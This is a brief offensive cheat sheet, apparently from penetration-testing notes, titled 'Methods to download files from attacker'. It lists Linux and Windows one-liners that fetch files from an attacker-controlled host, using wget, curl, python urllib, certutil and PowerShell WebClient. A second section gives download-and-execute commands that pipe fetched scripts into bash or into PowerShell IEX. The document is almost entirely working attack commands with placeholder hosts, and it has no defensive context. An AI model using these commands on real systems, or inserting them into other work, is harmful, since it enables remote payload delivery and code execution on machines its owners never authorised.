# Methods to download files from attacker

```bash
wget http://$address:$port/$download_path
wget $address:$port/$download_path
curl "http://$address:$port/$download_path" --output $file_name
python2 -c "import urllib; urllib.urlretrieve('http://lhost/some_file', 'somefile');"
```

```cmd
certutil -urlcache -split -f "http://$address:$port/$download_path" $file_name
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$address:$port/$download_path','$file_name')"
powershell -c "wget 'http://$address:$port/$download_path' -outfile $file_name" -UseBasicParsing
```

# Methods to download files from attacker and run it immediately 

```bash
wget -qO- "http://$address:$port/$download_path" | bash
curl "http://$address:$port/$download_path" | bash
```

```cmd
powershell IEX (New-Object Net.WebClient).DownloadString(\'http://$address:$port/$download_path\')
```
